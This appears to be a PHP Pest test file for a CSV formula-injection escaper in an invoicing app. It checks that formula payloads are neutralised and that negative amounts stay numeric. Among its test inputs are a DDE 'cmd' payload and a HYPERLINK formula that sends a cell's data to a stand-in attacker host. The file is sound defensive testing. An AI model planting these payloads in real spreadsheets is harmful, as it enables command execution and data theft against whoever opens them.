<?php

declare(strict_types=1);

use App\Modules\Shared\Support\CsvFormulaEscape;

/**
 * @param  array<array-key, mixed>  $record
 * @return array<array-key, mixed>
 */
function escapeCsvRecord(array $record): array
{
    return (CsvFormulaEscape::formatter())($record);
}

/**
 * The guard has to hold in both directions: a tenant's text must never
 * execute in whoever opens the file, and a negative amount must stay a
 * number so the column still sums.
 */
it('neutralises anything a spreadsheet would treat as a formula', function (string $payload): void {
    expect(escapeCsvRecord([$payload])[0])->toBe("'".$payload);
})->with([
    'DDE command' => ["=cmd|'/c calc'!A1"],
    'equals formula' => ['=1+1'],
    'plus formula' => ['+1+1'],
    'at formula' => ['@SUM(A1:A9)'],
    'hyperlink exfiltration' => ['=HYPERLINK("http://evil.example/"&A1,"click")'],
    'minus-led formula' => ['-1+cmd|calc'],
    'leading tab' => ["\t=1+1"],
    'leading carriage return' => ["\r=1+1"],
]);

/*
 * A credit note carries negative subtotal, VAT, total and balance. Escaping
 * those made them text, so every one of them dropped out of a SUM() over the
 * column and the figure an accountant read off the export was too high by
 * exactly the credit notes in it.
 */
it('leaves a plain number alone so the column still sums', function (string|int|float $value): void {
    expect(escapeCsvRecord([$value])[0])->toBe($value);
})->with([
    'negative amount, dot decimal' => ['-1200.00'],
    'negative amount, comma decimal' => ['-1200,00'],
    'positive amount, comma decimal' => ['1234,56'],
    'negative integer' => ['-500'],
    'positive amount' => ['1234.56'],
    'zero' => ['0.00'],
    'int' => [42],
    'float' => [42.5],
    'negative float' => [-42.5],
]);

it('still escapes anything that only looks numeric', function (): void {
    expect(escapeCsvRecord(['-1200.00 EUR'])[0])->toBe("'-1200.00 EUR")
        ->and(escapeCsvRecord(['-1.200,00 CZK'])[0])->toBe("'-1.200,00 CZK")
        ->and(escapeCsvRecord(['-1,200.00'])[0])->toBe("'-1,200.00")
        ->and(escapeCsvRecord(['-1200.00=A1'])[0])->toBe("'-1200.00=A1")
        ->and(escapeCsvRecord(['--1200'])[0])->toBe("'--1200");
});

it('leaves ordinary text untouched', function (): void {
    expect(escapeCsvRecord(['Acme s.r.o.', 'Consulting', '']))
        ->toBe(['Acme s.r.o.', 'Consulting', '']);
});
